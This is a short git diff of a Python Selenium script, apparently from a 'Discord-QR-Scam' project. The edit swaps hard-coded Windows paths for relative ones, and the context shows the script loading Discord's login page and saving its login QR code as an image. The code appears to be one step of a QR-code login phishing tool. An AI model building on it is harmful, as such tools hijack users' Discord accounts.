@@ -28,7 +28,7 @@ def main():
     options.add_experimental_option('excludeSwitches', ['enable-logging'])
     options.add_experimental_option('detach', True)
 
-    driver = webdriver.Chrome(options=options, executable_path=r'C:\\Users\\Artur\\Desktop\\Bot\\Discord-QR-Scam\\Discord-QR-Scam-main\\chromedriver.exe')
+    driver = webdriver.Chrome(options=options, executable_path=r'chromedriver.exe')
 
     driver.get('https://discord.com/login')
     time.sleep(5)
@@ -40,7 +40,7 @@ def main():
 
     div = soup.find('div', {'class': 'qrCode-wG6ZgU'})
     qr_code = soup.find('img')['src']
-    file = os.path.join(os.getcwd(), 'C:\\Users\\Artur\\Desktop\\Bot\\Discord-QR-Scam\\Discord-QR-Scam-main\\temp\\qr_code.png')
+    file = os.path.join(os.getcwd(), 'temp\\qr_code.png')
 
     img_data =  base64.b64decode(qr_code.replace('data:image/png;base64,', ''))
 
